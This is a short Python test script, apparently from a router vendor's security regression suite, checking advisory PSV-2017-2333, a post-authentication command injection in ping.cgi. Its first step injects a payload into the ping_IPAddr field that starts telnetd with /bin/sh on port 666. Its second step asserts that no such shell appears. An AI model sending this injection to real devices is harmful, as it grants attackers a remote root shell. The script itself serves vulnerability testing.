'''[PSV-2017-2333] Post-Auth RCE via ping.cgi '''
''' anthor Cloud 2017-12-12'''
'''v1.0 '''
from API._API import *

#def test_step_0():
    #log.info( 'step-0-0 dut loaddrfault wait 160s')
    #aploaddefault()
    #log.info( "step-0-1 AP Genie over leap done")
    #Genie_overleap()
#    log.info( "step-0-2 disable changed-url token")
#    Disable_changedToken()

def test_Step_1():
    log.info('step-1 Post-Auth RCE via dnslookup.cgi')
    telnet_port = '666'
    target_ip = hostip
    try:
        r = requests.get("http://" + target_ip + "/ping.cgi?IPAddr1=12&IPAddr2=12&IPAddr3=12&IPAddr4=12&ping=Ping&ping_IPAddr=12.12.12.12; /usr/sbin/telnetd -p " + telnet_port + " -l /bin/sh" + telnet_port + "&lookup=Lookup&ess_=true",auth=(user,passwd))
    except:
        print 'Get nothing'

def test_Step_2():
    log.info( 'step-2 judje telnet service port 666 port ')
    str = judjeduttelnet(host=hostip,username='admin',password='Password!',telnetport ='666',prompt='#')
    log.info(str)
    assert str == 'pass', "This action should not work." 
